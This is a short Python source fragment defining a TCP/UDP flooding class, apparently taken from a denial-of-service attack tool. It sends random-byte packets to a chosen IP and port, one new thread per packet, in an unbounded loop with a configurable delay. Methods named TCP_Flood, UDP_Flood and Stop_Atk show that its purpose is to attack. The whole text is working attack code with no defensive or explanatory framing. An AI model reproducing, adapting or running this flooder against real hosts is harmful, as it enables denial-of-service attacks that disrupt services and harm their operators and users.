class TCP_UDP_Flood:
    def __init__(self, ip, port, delay, pkt_size):
        self.ip = ip
        self.port = int(port)
        self.delay = float(delay)
        self.pkt_size = int(pkt_size)
        self.stop = False
    def gen_packet(self, size):
        return random._urandom(size)
    def UDP_Req(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(self.gen_packet(self.pkt_size), (self.ip, self.port))
            s.close()
        except:
            pass
    def TCP_req(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.ip, self.port))
            s.send(self.gen_packet(self.pkt_size))
            s.close()
        except:
            pass
    def Stop_Atk(self):
        self.stop = True
    def TCP_Flood(self):
        while True:
            try:
                tcp_req = threading.Thread(target=self.TCP_req)
                tcp_req.start()
                if self.stop:
                    break
                time.sleep(self.delay)
            except:
                pass
    def UDP_Flood(self):
        while True:
            try:
                udp_req = threading.Thread(target=self.UDP_Req)
                udp_req.start()
                if self.stop:
                    break
                time.sleep(self.delay)
            except:
                pass
